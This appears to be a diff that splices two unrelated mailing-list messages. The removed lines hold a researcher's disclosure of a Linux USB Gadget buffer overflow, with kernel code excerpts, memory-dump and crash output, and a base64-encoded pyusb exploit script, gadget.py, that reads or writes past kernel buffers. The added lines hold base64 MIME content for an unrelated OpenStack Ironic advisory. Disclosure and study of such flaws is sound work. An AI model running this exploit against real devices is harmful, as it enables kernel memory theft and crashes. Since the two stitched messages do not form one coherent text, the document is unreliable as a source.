+ S3BB18JMpwfJbs0PPairKVQwhPcEWmY6u8pI1J37vTG4MrABj1qZzKJ9SnkwRU1h6uVPdsom
+ 0dOzMl+arjW1yZEeXN3xGPq7s2ozyhrYR475/Pvk/G+B/HiUSR3sLybbUQ==
 
-Hello,
+--------------85900kXHvSXpfJ4CQ2jKwslx
+Content-Type: multipart/mixed; boundary="------------LBCVECTf6Od08JZLbdP0gJVE"
 
-As some of you might have already observed a buffer overflow vulnerability
-was recently patched in the Linux USB Gadget subsystem.
-
-TLTR; The issue reported to the Linux security team allowed one to read 
-and/or write up to 65kB of kernel memory past buffer boundaries by exploiting
-lack of limiting of the usb control transfer request wLength in certain
-gadget functions.
-
-You can find more details below. I also attached a sample exploit script
-based on pyusb to this message. You can also find a up to date version
-on my github under https://github.com/szymonh/inspector-gadget.
-
-Best regards,
-Szymon
-
----
-
-Summary
-
-An attacker can access kernel memory bypassing valid buffer boundaries by exploiting implementation of control request handlers in the following usb gadgets - rndis, hid, uac1, uac1_legacy and uac2. Processing of malicious control transfer requests with unexpectedly large wLength lacks assurance that this value does not exceed the buffer size. Due to this fact one is capable of reading and/or writing (depending on particular case) up to 65k of kernel memory.
-
-Description
-
-Some execution paths of usb control transfer handlers of gadgets such as rndis, hid, uac1, uac1_legacy and uac2 do not include proper handling of request length (wLength). This value should be limited to buffer size to prevent buffer overflow vulnerabilities in the data transfer phase. 
-
-The buffer used by endpoint 0 is allocated in composite.c with size of USB_COMP_EP0_BUFSIZ (4096) bytes so
-setting wLength to a value greater than USB_COMP_EP0_BUFSIZ will result in a buffer overflow.
-
-For example in the case of f_uac1.c, execution of the f_audio_setup function allows one to perform both reads and writes past buffer boundaries. Neither f_audio_setup nor none of the called functions - audio_set_endpoint_req, audio_get_endpoint_req, out_rq_cur, ac_rq_in limit the return value to be smaller than the buffer size. Consequently the data transfer phase uses req->length = value = ctrl->wLength which is controlled by the attacker. This allows one to either read or write up to 65k bytes of kernel memory depending on the control transfer direction.
-
-    static int
-    f_audio_setup(struct usb_function *f, const struct usb_ctrlrequest *ctrl)
-    {
-            struct usb_composite_dev *cdev = f->config->cdev;
-            struct usb_request      *req = cdev->req;
-            int                     value = -EOPNOTSUPP;
-            u16                     w_index = le16_to_cpu(ctrl->wIndex);
-            u16                     w_value = le16_to_cpu(ctrl->wValue);
-            u16                     w_length = le16_to_cpu(ctrl->wLength);
-
-            /* composite driver infrastructure handles everything; interface
-             * activation uses set_alt().
-             */
-            switch (ctrl->bRequestType) {
-            case USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_ENDPOINT:
-                    value = audio_set_endpoint_req(f, ctrl);
-                    break;
-
-            case USB_DIR_IN | USB_TYPE_CLASS | USB_RECIP_ENDPOINT:
-                    value = audio_get_endpoint_req(f, ctrl);
-                    break;
-            case USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_INTERFACE:
-                    if (ctrl->bRequest == UAC_SET_CUR)
-                            value = out_rq_cur(f, ctrl);
-                    break;
-            case USB_DIR_IN | USB_TYPE_CLASS | USB_RECIP_INTERFACE:
-                    value = ac_rq_in(f, ctrl);
-                    break;
-            default:
-                    ERROR(cdev, "invalid control req%02x.%02x v%04x i%04x l%d\n",
-                            ctrl->bRequestType, ctrl->bRequest,
-                            w_value, w_index, w_length);
-            }
-
-            /* respond with data transfer or status phase? */
-            if (value >= 0) {
-                    DBG(cdev, "audio req%02x.%02x v%04x i%04x l%d\n",
-                            ctrl->bRequestType, ctrl->bRequest,
-                            w_value, w_index, w_length);
-                    req->zero = 0;
-                    req->length = value;
-                    value = usb_ep_queue(cdev->gadget->ep0, req, GFP_ATOMIC);
-
-                    if (value < 0)
-                            ERROR(cdev, "audio response on err %d\n", value);
-            }
-
-            /* device either stalls (value < 0) or reports success */
-            return value;
-    } 
-
- 
-Execution of the sample readout exploit allows dumping of up to 65k of memory.
-
-    $ ./gadget.py -v 0x1b67 -p 0x400c -f uac1 | wc -c
-    65535
-
-     
-
-    $ ./gadget.py -v 0x1b67 -p 0x400c -f uac1 | strings
-
-    nsole=tty1 root=PARTUUID=e02024cb-02 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait modules-load=dwc2
-    tem.slice/system-getty.slice/getty@ttyGS0.service
-    !rE*
-    ?& .4!
-    0usb_composite_setup_continue
-    composite_setup
-    usb_gadget_get_string
-    usb_otg_descriptor_init
-    usb_otg_descriptor_alloc
-    usb_free_all_descriptors
-    usb_assign_descriptors
-    usb_copy_descriptors
-
-    usb_gadget_config_buf 
-
-
-On the other hand, execution of the overwrite exploit allows one to write arbitrary data past expected buffer boundaries.
-
-    $ ./gadget.py -v 0x1b67 -p 0x400c -f uac1 -d write
-
-
-    Message from syslogd@zero at Dec  6 19:56:01 ...
-     kernel:[  103.850206] Internal error: Oops: 5 [#1] ARM
-
-
-Similarly in case of the rndis gadget the rndis_setup function can be exploited to write past buffer boundaries using control transfer request with direction out, type class, recipient interface and bRequest set to USB_CDC_SEND_ENCAPSULATED_COMMAND. 
-
-    static int
-    rndis_setup(struct usb_function *f, const struct usb_ctrlrequest *ctrl)
-    {
-            struct f_rndis          *rndis = func_to_rndis(f);
-            struct usb_composite_dev *cdev = f->config->cdev;
-            struct usb_request      *req = cdev->req;
-            int                     value = -EOPNOTSUPP;
-            u16                     w_index = le16_to_cpu(ctrl->wIndex);
-            u16                     w_value = le16_to_cpu(ctrl->wValue);
-            u16                     w_length = le16_to_cpu(ctrl->wLength);
-            /* composite driver infrastructure handles everything except
-             * CDC class messages; interface activation uses set_alt().
-             */
-            switch ((ctrl->bRequestType << 8) | ctrl->bRequest) {
-            /* RNDIS uses the CDC command encapsulation mechanism to implement
-             * an RPC scheme, with much getting/setting of attributes by OID.
-             */
-            case ((USB_DIR_OUT | USB_TYPE_CLASS | USB_RECIP_INTERFACE) << 8)
-                            | USB_CDC_SEND_ENCAPSULATED_COMMAND:
-                    if (w_value || w_index != rndis->ctrl_id)
-                            goto invalid;
-                    /* read the request; process it later */
-                    value = w_length;
-                    req->complete = rndis_command_complete;
-                    req->context = rndis;
-                    /* later, rndis_response_available() sends a notification */
-                    break;
-
-     ... 
-
-     ...
-
-            /* respond with data transfer or status phase? */
-            if (value >= 0) {
-                    DBG(cdev, "rndis req%02x.%02x v%04x i%04x l%d\n",
-                            ctrl->bRequestType, ctrl->bRequest,
-                            w_value, w_index, w_length);
-                    req->zero = (value < w_length);
-                    req->length = value;
-                    value = usb_ep_queue(cdev->gadget->ep0, req, GFP_ATOMIC);
-                    if (value < 0)
-                            ERROR(cdev, "rndis response on err %d\n", value);
-            }
-            /* device either stalls (value < 0) or reports success */
-            return value;
-
-    } 
-
-
-Vulnerable execution paths:
-- f_rndis.c
-    - rndis_setup
-- f_uac1.c
-    - out_rq_cur
-    - ac_rq_in
-    - audio_set_endpoint_req
-    - audio_get_endpoint_req
-- f_uac1_legacy.c
-    - audio_set_intf_req
-    - audio_set_endpoint_req
-    - audio_get_endpoint_req
-- f_uac2.c
-    - out_rq_cur
-- f_hid.c
-    - hid_gsetup for HID_REQ_SET_REPORT case
-
-Impact
-
-Devices implementing affected usb device gadget classes (rndis, hid, uac1, uac1_legacy, uac2) may be affected by buffer overflow vulnerabilities resulting in information disclosure, denial of service or execution of arbitrary code in kernel context.
-
-Expected resolution
-
-Limit the transfer phase size to min(len, buffer_size) in affected control request handlers to assure that a buffer overflow will not occur.
-
-Key dates
-
-- 07.12.2021 - reported the issue to Kernel security team
-- 09.12.2021 - draft patch provided by Kernel security team
-- 12.12.2021 - fix merged to main Linux kernel tree (public)
-
-
-I attached sample exploits based on pyusb. For optimal results libusb on the malicious host should be compiled with support for large request transfer messages (MAX_CTRL_BUFFER_LENGTH). 
-
---------------ij6TTlDZPiBme4myj3pEvvaH
-Content-Type: text/x-python-script; charset=UTF-8; name="gadget.py"
-Content-Disposition: attachment; filename="gadget.py"
+--------------LBCVECTf6Od08JZLbdP0gJVE
+Content-Type: text/plain; charset=UTF-8; format=flowed
 Content-Transfer-Encoding: base64
 
-IyEvdXNyL2Jpbi9weXRob24zCgojCiMgQ1ZFLTIwMjEtMzk2ODUKIwojIFRo
-aXMgc2FtcGxlIHNjcmlwdCBhdHRlbXB0cyB0byBleHBsb2l0IGxhY2sKIyBv
-ZiBjb250cm9sIHRyYW5zZmVyIHJlcXVlc3Qgd0xlbmd0aCBsaW1pdGluZwoj
-IGJ5IExpbnV4IGtlcm5lbCdzIFVTQiBnYWRnZXQgc3Vic3lzdGVtLgojCiMg
-RXhwbG9pdGFibGUgZnVuY3Rpb25zIGluY2x1ZGUgcm5kaXMsIGhpZCwKIyB1
-YWMxLCB1YWMxX2xlZ2FjeSwgdWFjMi4KIwojIE9uIHRoZSBob3N0IHNpZGUg
-dXNlIGEgY3VzdG9tIGJ1aWxkIG9mIGxpYnVzYgojIHdpdGggTUFYX0NUUkxf
-QlVGRkVSX0xFTkdUSCBpbmNyZWFzZWQgdG8gMHhmZmZmCiMgZnJvbSBkZWZh
-dWx0IHZhbHVlIG9mIDQwOTYuCiMKIyBUaGUgRVAwIGJ1ZmZlciBhcyBhbGxv
-Y2F0ZWQgaW4gY29tcG9zaXRlLmMgaXMKIyBVU0JfQ09NUF9FUDBfQlVGU0la
-IGJ5dGVzIGxhcmdlIHNvIGV2ZXJ5dGhpbmcgcGFzdAojIDQwOTYgd2lsbCBj
-YXVzZSBidWZmZXIgb3ZlcmZsb3cuCiMKIyBVc2Ugc2FtcGxlczoKIyBzdWRv
-IC4vZ2FkZ2V0LnB5IC12IDB4MThkMSAtcCAweDRlMjMgLWYgcm5kaXMKIyBz
-dWRvIC4vZ2FkZ2V0LnB5IC12IDB4MWI2NyAtcCAweDQwMGMgLWYgdWFjMSAt
-ZCByZWFkCiMKIyBUaGlzIHNjcmlwdCByZXF1aXJlcyBweXVzYi4KIwojIGh0
-dHBzOi8vZ2l0aHViLmNvbS9zenltb25oL2luc3BlY3Rvci1nYWRnZXQKIwoK
-aW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBzeXMKCmltcG9ydCB1c2IuY29yZQpp
-bXBvcnQgdXNiLnV0aWwKCgpDVFJMX1JFUV9NQVAgPSB7CiAgICAndWFjMSc6
-IHsKICAgICAgICAncmVhZCc6IHsKICAgICAgICAgICAgJ2JtUmVxdWVzdFR5
-cGUnOiAweGEyLCAgICAgICAgICAgICAgICAjIFVTQl9ESVJfSU4gfCBVU0Jf
-VFlQRV9DTEFTUyB8IFVTQl9SRUNJUF9FTkRQT0lOVAogICAgICAgICAgICAn
-YlJlcXVlc3QnOiAxMjksICAgICAgICAgICAgICAgICAgICAgICMgVUFDX0dF
-VF9DVVIKICAgICAgICAgICAgJ3dWYWx1ZSc6IDB4MDAsCiAgICAgICAgICAg
-ICd3SW5kZXgnOiAweDAwLAogICAgICAgIH0sCiAgICAgICAgJ3dyaXRlJzog
-ewogICAgICAgICAgICAnYm1SZXF1ZXN0VHlwZSc6IDB4MjIsICAgICAgICAg
-ICAgICAgICMgVVNCX0RJUl9PVVQgfCBVU0JfVFlQRV9DTEFTUyB8IFVTQl9S
-RUNJUF9FTkRQT0lOVAogICAgICAgICAgICAnYlJlcXVlc3QnOiAweDAxLCAg
-ICAgICAgICAgICAgICAgICAgICMgVUFDX1NFVF9DVVIKICAgICAgICAgICAg
-J3dWYWx1ZSc6IDB4MDAsCiAgICAgICAgICAgICd3SW5kZXgnOiAweDAwLAog
-ICAgICAgIH0KICAgIH0sCiAgICAndWFjMV9sZWdhY3knOiB7CiAgICAgICAg
-J3JlYWQnOiB7CiAgICAgICAgICAgICdibVJlcXVlc3RUeXBlJzogMHhhMiwg
-ICAgICAgICAgICAgICAgIyBVU0JfRElSX0lOIHwgVVNCX1RZUEVfQ0xBU1Mg
-fCBVU0JfUkVDSVBfRU5EUE9JTlQKICAgICAgICAgICAgJ2JSZXF1ZXN0Jzog
-MTI5LCAgICAgICAgICAgICAgICAgICAgICAjIFVBQ19HRVRfQ1VSCiAgICAg
-ICAgICAgICd3VmFsdWUnOiAweDAwLAogICAgICAgICAgICAnd0luZGV4Jzog
-MHgwMCwKICAgICAgICB9LAogICAgICAgICd3cml0ZSc6IHsKICAgICAgICAg
-ICAgJ2JtUmVxdWVzdFR5cGUnOiAweDIyLCAgICAgICAgICAgICAgICAjIFVT
-Ql9ESVJfT1VUIHwgVVNCX1RZUEVfQ0xBU1MgfCBVU0JfUkVDSVBfRU5EUE9J
-TlQKICAgICAgICAgICAgJ2JSZXF1ZXN0JzogMHgwMSwgICAgICAgICAgICAg
-ICAgICAgICAjIFVBQ19TRVRfQ1VSCiAgICAgICAgICAgICd3VmFsdWUnOiAw
-eDAwLAogICAgICAgICAgICAnd0luZGV4JzogMHgwMCwKICAgICAgICB9CiAg
-ICB9LAogICAgJ3VhYzInOiB7CiAgICAgICAgJ3dyaXRlJzogewogICAgICAg
-ICAgICAnYm1SZXF1ZXN0VHlwZSc6IDB4MjEsICAgICAgICAgICAgICAgICMg
-VVNCX0RJUl9PVVQgfCBVU0JfVFlQRV9DTEFTUyB8IFVTQl9SRUNJUF9JTlRF
-UkZBQ0UKICAgICAgICAgICAgJ2JSZXF1ZXN0JzogMSwgICAgICAgICAgICAg
-ICAgICAgICAgICAjIFVBQzJfQ1NfQ1VSCiAgICAgICAgICAgICd3VmFsdWUn
-OiAoMHgwMSA8PCA4KSwgICAgICAgICAgICAgICAgIyBoaWdoZXIgYnl0ZSBz
-ZXQgdG8gVUFDMl9DU19DT05UUk9MX1NBTV9GUkVRCiAgICAgICAgICAgICd3
-SW5kZXgnOiAwLCAgICAgICAgICAgICAgICAgICAgICAgICAgIyBsb3dlciBi
-eXRlIHNldCB0byB1YWMyLT5hY19pbnRmLCBoaWdoZXIgVVNCX0lOX0NMS19J
-RAogICAgICAgIH0KICAgIH0sCiAgICAncm5kaXMnOiB7CiAgICAgICAgJ3dy
-aXRlJzogewogICAgICAgICAgICAnYm1SZXF1ZXN0VHlwZSc6IDB4MjEsICAg
-ICAgICAgICAgICAgICMgVVNCX0RJUl9PVVQgfCBVU0JfVFlQRV9DTEFTUyB8
-IFVTQl9SRUNJUF9JTlRFUkZBQ0UKICAgICAgICAgICAgJ2JSZXF1ZXN0Jzog
-MHgwMCwgICAgICAgICAgICAgICAgICAgICAjIFVTQl9DRENfU0VORF9FTkNB
-UFNVTEFURURfQ09NTUFORAogICAgICAgICAgICAnd1ZhbHVlJzogMHgwMCwg
-ICAgICAgICAgICAgICAgICAgICAgICMgbmVlZHMgdG8gYmUgMAogICAgICAg
-ICAgICAnd0luZGV4JzogMHgwMCwgICAgICAgICAgICAgICAgICAgICAgICMg
-bXVzdCBiZSBzZXQgdG8gcm5kaXMtPmN0cmxfaWQKICAgICAgICB9CiAgICB9
-LAogICAgJ2hpZCc6IHsKICAgICAgICAnd3JpdGUnOiB7ICAgICAgICAgICAg
-ICAgICAgICAgICAgICAgICAgICAjIGhpZGctPnVzZV9vdXRfZXAgbXVzdCBi
-ZSBmYWxzZQogICAgICAgICAgICAnYm1SZXF1ZXN0VHlwZSc6IDB4MjEsICAg
-ICAgICAgICAgICAgICMgVVNCX0RJUl9PVVQgfCBVU0JfVFlQRV9DTEFTUyB8
-IFVTQl9SRUNJUF9JTlRFUkZBQ0UKICAgICAgICAgICAgJ2JSZXF1ZXN0Jzog
-MHgwOSwgICAgICAgICAgICAgICAgICAgICAjIEhJRF9SRVFfU0VUX1JFUE9S
-VAogICAgICAgICAgICAnd1ZhbHVlJzogMHgwMCwgICAgICAgICAgICAgICAg
-ICAgICAgICMgZG9uJ3QgY2FyZQogICAgICAgICAgICAnd0luZGV4JzogMHgw
-MCwgICAgICAgICAgICAgICAgICAgICAgICMgZG9uJ3QgY2FyZQogICAgICAg
-IH0KICAgIH0KfQoKCmRlZiBhdXRvX2ludCh2YWw6IHN0cikgLT4gaW50Ogog
-ICAgJycnQ29udmVydCBhcmJpdHJhcnkgc3RyaW5nIHRvIGludGVnZXIKCiAg
-ICBVc2VkIGFzIGFyZ3BhcnNlIHR5cGUgdG8gYXV0b21hdGljYWxseSBoYW5k
-bGUgaW5wdXQgd2l0aAogICAgZGlmZmVyZW50IGJhc2UgLSBkZWNpbWFsLCBv
-Y3RhbCwgaGV4IGV0Yy4KCiAgICAnJycKICAgIHJldHVybiBpbnQodmFsLCAw
-KQoKCmRlZiBwYXJzZV9hcmdzKCkgLT4gYXJncGFyc2UuTmFtZXNwYWNlOgog
-ICAgJycnUGFyc2UgY29tbWFuZCBsaW5lIGFyZ3VtZW50cwoKICAgICcnJwog
-ICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoCiAgICAgICAg
-ZGVzY3JpcHRpb249J1NhbXBsZSBleHBsb2l0IGZvciBSTkRJUyBnYWRnZXQg
-Y2xhc3MnCiAgICApCgogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLXYnLCAn
-LS12aWQnLCAgdHlwZT1hdXRvX2ludCwgcmVxdWlyZWQ9VHJ1ZSwKICAgICAg
-ICAgICAgICAgICAgICAgICAgaGVscD0ndmVuZG9yIGlkJykKICAgIHBhcnNl
-ci5hZGRfYXJndW1lbnQoJy1wJywgJy0tcGlkJywgdHlwZT1hdXRvX2ludCwg
-cmVxdWlyZWQ9VHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgaGVscD0n
-cHJvZHVjdCBpZCcpCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctbCcsICct
-LWxlbmd0aCcsIHR5cGU9YXV0b19pbnQsIGRlZmF1bHQ9MHhmZmZmLAogICAg
-ICAgICAgICAgICAgICAgICAgICByZXF1aXJlZD1GYWxzZSwgaGVscD0nbGVu
-Z2h0IG9mIGRhdGEgdG8gd3JpdGUnKQogICAgcGFyc2VyLmFkZF9hcmd1bWVu
-dCgnLWQnLCAnLS1kaXJlY3Rpb24nLCB0eXBlPXN0ciwgZGVmYXVsdD0ncmVh
-ZCcsCiAgICAgICAgICAgICAgICAgICAgICAgIGNob2ljZXM9WydyZWFkJywg
-J3dyaXRlJ10sCiAgICAgICAgICAgICAgICAgICAgICAgIGhlbHA9J2RpcmVj
-dGlvbiBvZiBvcGVyYXRpb24gZnJvbSBob3N0IHBlcnNwZWN0aXZlJykKICAg
-IHBhcnNlci5hZGRfYXJndW1lbnQoJy1mJywgJy0tZnVuY3Rpb24nLCB0eXBl
-PXN0ciwgZGVmYXVsdD0ncm5kaXMnLAogICAgICAgICAgICAgICAgICAgICAg
-ICBjaG9pY2VzPSgncm5kaXMnLCAndWFjMScsICd1YWMxX2xlZ2FjeScsICd1
-YWMyJywgJ2hpZCcpKQoKICAgIHJldHVybiBwYXJzZXIucGFyc2VfYXJncygp
-CgoKZGVmIHNldHVwX2RldmljZShhcmdzOiBhcmdwYXJzZS5OYW1lc3BhY2Up
-OgogICAgJycnRmluZCBhbmQgcHJlcGFyZSB0aGUgdXNiIGRldmljZQoKICAg
-ICcnJwogICAgdXNiZGV2ID0gdXNiLmNvcmUuZmluZChpZFZlbmRvcj1hcmdz
-LnZpZCwgaWRQcm9kdWN0PWFyZ3MucGlkKQogICAgaWYgdXNiZGV2IGlzIE5v
-bmU6CiAgICAgICAgcHJpbnQoJ0RldmljZSBub3QgZm91bmQsIHZlcmlmeSBz
-cGVjaWZpZWQgVklEIGFuZCBQSUQnKQogICAgICAgIHN5cy5leGl0KDEpCgog
-ICAgZm9yIGNmZyBpbiB1c2JkZXY6CiAgICAgICAgZm9yIGlkeCBpbiByYW5n
-ZShjZmcuYk51bUludGVyZmFjZXMpOgogICAgICAgICAgICBpZiB1c2JkZXYu
-aXNfa2VybmVsX2RyaXZlcl9hY3RpdmUoaWR4KToKICAgICAgICAgICAgICAg
-IHVzYmRldi5kZXRhY2hfa2VybmVsX2RyaXZlcihpZHgpCiAgICB1c2JkZXYu
-c2V0X2NvbmZpZ3VyYXRpb24oKQogICAgcmV0dXJuIHVzYmRldgoKCmRlZiBi
-dWlsZF9wYXlsb2FkKGxlbmd0aDogaW50KSAtPiBieXRlYXJyYXk6CiAgICAn
-JydQcm92aWRlIGEgcGF5bG9hZCB0byB1c2UKCiAgICBUaGlzIHNob3VsZCBp
-bmNsdWRlIHNvbWUgbmljZSBjb2RlIGJ1dCBmb3IKICAgIHB1cmUgZGVtbyBB
-cyBzaG91bGQgYmUgZmluZS4KCiAgICAnJycKICAgIHBheWxvYWQgPSBieXRl
-YXJyYXkoKQogICAgZm9yIGkgaW4gcmFuZ2UoMCwgbGVuZ3RoKToKICAgICAg
-ICBwYXlsb2FkLmFwcGVuZChvcmQoJ0EnKSkKICAgIHJldHVybiBwYXlsb2Fk
-CgoKZGVmIHBpY2tfcmVxdWVzdChhcmdzOiBhcmdwYXJzZS5OYW1lc3BhY2Up
-IC0+IGRpY3Q6CiAgICAnJydDaG9vc2UgY29udHJvbCB0cmFuc2ZlciByZXF1
-ZXN0CgogICAgJycnCiAgICBpZiBhcmdzLmRpcmVjdGlvbiBub3QgaW4gQ1RS
-TF9SRVFfTUFQW2FyZ3MuZnVuY3Rpb25dOgogICAgICAgIGFyZ3MuZGlyZWN0
-aW9uID0gbGlzdChDVFJMX1JFUV9NQVBbYXJncy5mdW5jdGlvbl0ua2V5cygp
-KVswXQoKICAgIGN0cmxfcmVxID0gQ1RSTF9SRVFfTUFQW2FyZ3MuZnVuY3Rp
-b25dW2FyZ3MuZGlyZWN0aW9uXQoKICAgIGlmIGFyZ3MuZGlyZWN0aW9uID09
-ICdyZWFkJzoKICAgICAgICBjdHJsX3JlcVsnZGF0YV9vcl93TGVuZ3RoJ10g
-PSBhcmdzLmxlbmd0aAogICAgZWxzZToKICAgICAgICBjdHJsX3JlcVsnZGF0
-YV9vcl93TGVuZ3RoJ10gPSBidWlsZF9wYXlsb2FkKGFyZ3MubGVuZ3RoKQoK
-ICAgIHJldHVybiBjdHJsX3JlcQoKCmRlZiBwcmVzZW50X3Jlc3BvbnNlKGFy
-Z3M6IGFyZ3BhcnNlLk5hbWVzcGFjZSwgZGF0YSkgLT4gTm9uZToKICAgICcn
-J1ByZXNlbnQgdGhlIHJldHJpZXZlZCBtZW0gY29udGVudHMgZm9yIHJlYWQK
-CiAgICAnJycKICAgIGlmIGFyZ3MuZGlyZWN0aW9uID09ICd3cml0ZSc6CiAg
-ICAgICAgcHJpbnQoJ1dyb3RlIHt9IGJ5dGVzIG9mIGRhdGEnLmZvcm1hdChk
-YXRhKSkKICAgICAgICBwcmludCgnUGxlYXNlIGNoZWNrIHRoZSBkZXZpY2Ug
-c3RhdGUnKQogICAgZWxzZToKICAgICAgICBzeXMuc3Rkb3V0LmJ1ZmZlci53
-cml0ZShkYXRhKQoKCmRlZiBleHBsb2l0KGFyZ3M6IGFyZ3BhcnNlLk5hbWVz
-cGFjZSkgLT4gTm9uZToKICAgICcnJ0V4cGxvaXQgdGhlIEdhZGdldAoKICAg
-ICcnJwogICAgdXNiZGV2ID0gc2V0dXBfZGV2aWNlKGFyZ3MpCiAgICBjdHJs
-X3JlcSA9IHBpY2tfcmVxdWVzdChhcmdzKQogICAgZGF0YSA9IHVzYmRldi5j
-dHJsX3RyYW5zZmVyKCoqY3RybF9yZXEpCiAgICBwcmVzZW50X3Jlc3BvbnNl
-KGFyZ3MsIGRhdGEpCgoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAg
-ICcnJ01haW4gc2NyaXB0CgogICAgJycnCiAgICBleHBsb2l0KHBhcnNlX2Fy
-Z3MoKSkK
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09DQpPU1NBLTIwMjYtMDE5OiBGaWxlIEV4dHJhY3Rpb24gZnJvbSBJcm9uaWMg
+Y29uZHVjdG9yIHZpYSBweGVfdGVtcGxhdGUNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KDQo6RGF0ZTogSnVuZSAw
+MywgMjAyNg0KOkNWRTogQ1ZFLTIwMjYtNDQ5MTcNCg0KDQpBZmZlY3RzDQp+fn5+fn5+DQotIEly
+b25pYzogPj0xNy4wLjAgPDI2LjEuNywgPj0yNy4wLjAgPDI5LjAuNiwgPj0zMC4wLjAgPDMyLjAu
+MiwgPj0zMy4wLjAgDQo8MzUuMC4yDQoNCg0KRGVzY3JpcHRpb24NCn5+fn5+fn5+fn5+DQpEbWl0
+cnkgVGFudHN1ciAoUmVkIEhhdCkgYW5kIFR1b21vIFRhbnNrYW5lbiAoRXJpY3Nzb24gU29mdHdh
+cmUgDQpUZWNobm9sb2d5KSBmcm9tIHRoZSBNZXRhbDMuaW8gU2VjdXJpdHkgVGVhbSByZXBvcnRl
+ZCBhIHZ1bG5lcmFiaWxpdHkgaW4gDQpJcm9uaWMncyBib290IGludGVyZmFjZXMuIEEgcHJvamVj
+dCBvd25lciBvciBtYW5hZ2VyIHdpdGggYWNjZXNzIHRvIA0KbW9kaWZ5IGBgbm9kZS5kcml2ZXJf
+aW5mb1tweGVfdGVtcGxhdGVdYGAgY2FuIHNldCBpdCB0byANCmBgL2V0Yy9pcm9uaWMvaXJvbmlj
+LmNvbmZgYCBvciBhbnkgb3RoZXIgc2Vuc2l0aXZlIGZpbGUgcmVhZGFibGUgYnkgdGhlIA0KY29u
+ZHVjdG9yIHByb2Nlc3MuIElyb25pYyB3aWxsIHRoZW4gcGxhY2UgdGhpcyAidGVtcGxhdGUgZmls
+ZSIgaW50byBhIA0KVEZUUCBvciBIVFRQIHNlcnZlciBmb3IgbmV0Ym9vdGluZywgd2hlcmUgaXQg
+Y2FuIGJlIGZldGNoZWQgYnkgYW55dGhpbmcgDQp3aXRoIG5ldHdvcmsgYWNjZXNzIHRvIHRoZSBj
+b25kdWN0b3IuDQpJcm9uaWMgaW50ZW5kcyBvbiBjb21wbGV0ZWx5IHJlbW92aW5nIHRoaXMgZmVh
+dHVyZSBpbiBhIGZ1dHVyZSByZWxlYXNlLg0KDQoNCg0KUGF0Y2hlcw0Kfn5+fn5+fg0KLSBodHRw
+czovL3Jldmlldy5vcGVuZGV2Lm9yZy9jL29wZW5zdGFjay9pcm9uaWMvKy85OTEzODkgDQooMjAy
+My4xL2FudGVsb3BlICh1bm1haW50YWluZWQpKQ0KLSBodHRwczovL3Jldmlldy5vcGVuZGV2Lm9y
+Zy9jL29wZW5zdGFjay9pcm9uaWMvKy85OTEzODUgKDIwMjQuMS9jYXJhY2FsIA0KKHVubWFpbnRh
+aW5lZCkpDQotIGh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnL2Mvb3BlbnN0YWNrL2lyb25pYy8r
+Lzk5MTM4MiAoMjAyNS4xL2Vwb3h5KQ0KLSBodHRwczovL3Jldmlldy5vcGVuZGV2Lm9yZy9jL29w
+ZW5zdGFjay9pcm9uaWMvKy85OTEzNzkgKDIwMjUuMi9mbGFtaW5nbykNCi0gaHR0cHM6Ly9yZXZp
+ZXcub3BlbmRldi5vcmcvYy9vcGVuc3RhY2svaXJvbmljLysvOTkxMzc2ICgyMDI2LjEvZ2F6cGFj
+aG8pDQotIGh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnL2Mvb3BlbnN0YWNrL2lyb25pYy8rLzk5
+MTM2NyANCigyMDI2LjIvaGliaXNjdXMgKGRldmVsb3BtZW50KSkNCi0gaHR0cHM6Ly9yZXZpZXcu
+b3BlbmRldi5vcmcvYy9vcGVuc3RhY2svaXJvbmljLysvOTkxMzczIChCdWdmaXgvMzMuMCkNCi0g
+aHR0cHM6Ly9yZXZpZXcub3BlbmRldi5vcmcvYy9vcGVuc3RhY2svaXJvbmljLysvOTkxMzcwIChC
+dWdmaXgvMzQuMCkNCg0KDQpDcmVkaXRzDQp+fn5+fn5+DQotIERtaXRyeSBUYW50c3VyIGZyb20g
+UmVkIEhhdA0KLSBUdW9tbyBUYW5za2FuZW4gZnJvbSBFcmljc3NvbiBTb2Z0d2FyZSBUZWNobm9s
+b2d5DQoNCg0KUmVmZXJlbmNlcw0Kfn5+fn5+fn5+fg0KLSBodHRwczovL2J1Z3MubGF1bmNocGFk
+Lm5ldC9pcm9uaWMvK2J1Zy8yMTQ4MzE5DQotIGh0dHA6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4v
+Y3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAyNi00NDkxNw0KDQoNCk5vdGVzDQp+fn5+fg0KLSBSZWxl
+YXNlcyAyMDI0LjEgKGNhcmFjYWwpIGFuZCAyMDIzLjEgKGFudGVsb3BlKSBhcmUgdW5tYWludGFp
+bmVkLg0KIMKgIFBhdGNoZXMgYXJlIHByb3ZpZGVkIGFzIGEgY291cnRlc3kuIFJlbGVhc2VzIDIw
+MjMuMiAoYm9iY2F0KSBhbmQNCiDCoCAyMDI0LjIgKGRhbG1hdGlvbikgYXJlIGVuZCBvZiBsaWZl
+IGFuZCBoYXZlIG5vdCBoYWQgcGF0Y2hlcyBwcm92aWRlZC4NCiDCoCBTZWUgaHR0cHM6Ly9yZWxl
+YXNlcy5vcGVuc3RhY2sub3JnIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIHN1cHBvcnRlZA0KIMKg
+IHJlbGVhc2VzLg0KLSBJcm9uaWMgYnVnZml4IGJyYW5jaCBwYXRjaGVzIHdpbGwgYmUgYXZhaWxh
+YmxlIGluIGdpdCBmb3IgaW50ZXJlc3RlZA0KIMKgIG9wZXJhdG9ycy4gV2Ugd2lsbCBub3QgcGVy
